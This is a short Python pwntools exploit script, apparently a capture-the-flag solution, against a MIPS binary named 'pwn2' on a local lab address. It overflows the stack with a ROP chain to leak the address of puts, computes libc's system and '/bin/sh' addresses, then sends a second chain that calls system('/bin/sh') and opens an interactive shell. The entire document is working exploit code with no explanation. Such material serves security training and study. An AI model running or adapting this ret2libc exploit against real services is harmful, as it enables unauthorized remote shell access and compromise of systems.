from pwn import *

#context.log_level="debug"

#r = remote("127.0.0.1",8881)
r = remote("192.168.209.129",10001)
#r = process("./build_pwn2.sh")
elf = ELF("./pwn2")
#libc = ELF("/home/h4lo/mipsel-env/lib/libuClibc-0.9.33.2.so")
#libc = ELF("ld-uClibc.so.0")
libc = ELF("libc.so.0")

payload = "H4lo"
#payload += p32(0x00410AA0)

r.recvuntil("What's your name:")
r.sendline(payload)

sleep(0.2)
r.recv()

sleep(0.2)

# gadget1
payload = p32(1) * 9
payload += p32(0x004006C8)

#payload += p32(elf.plt['puts'])	# fp
payload += p32(1)

payload += "a" * 0x18
payload += 'a' * 4 # s0
#payload += p32(elf.got['puts']) # s1
payload += p32(0x00410B58)
payload += p32(0x0040092C) # s2


payload += 'a' * 4 # s3
payload += p32(0x004007A4) # ra


payload += 'a'*0x20
payload += p32(0x004007C4)

sleep(0.2)
r.send(payload)

r.recv()
#success(a)
libc_addr = u32(r.recv(4))-libc.symbols['puts']

success("libc_addr: " + hex(libc_addr))

r.recv()
#r.send(payload)
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + 0x9bc48



# gadget2
payload = 'a'*0x24
payload += p32(0x004006C8)

payload += 'a'*0x1c
payload += 'a'*4 #s0
payload += p32(binsh_addr)
payload += p32(system_addr)
payload += 'a'*4
payload += p32(0x004007A4)

r.send(payload)


r.interactive()
